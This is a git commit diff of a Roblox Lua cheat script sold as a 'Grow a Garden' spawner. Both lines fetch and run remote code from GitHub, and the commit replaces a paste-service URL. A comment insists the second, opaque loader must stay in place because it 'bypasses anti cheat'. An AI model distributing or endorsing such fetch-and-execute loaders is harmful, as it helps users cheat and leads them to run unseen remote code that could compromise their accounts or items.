44b12a8585118671df5a474fadca8159289f2209
Roblox Scripts <gregyheport@gmail.com>
2025-08-21 07:32:25 +0800

    Update X-Hub-Spawner-Script-GrowAGarden-Working.lua

--- X-Hub-Spawner-Script-GrowAGarden-Working.lua
+++ X-Hub-Spawner-Script-GrowAGarden-Working.lua
@@ -1,4 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/GrowAGarden-X-Hub-Spawner.lua"))()
 task.wait(1)
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/tjyei4koLPTiUYDf/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/bloodball/refs/heads/main/loader2.lua"))()
 -- ⚠️ Dont Remove the 2nd script it bypass anti cheat but if you remove it you will get banned 50% chance ban rate ⚠️
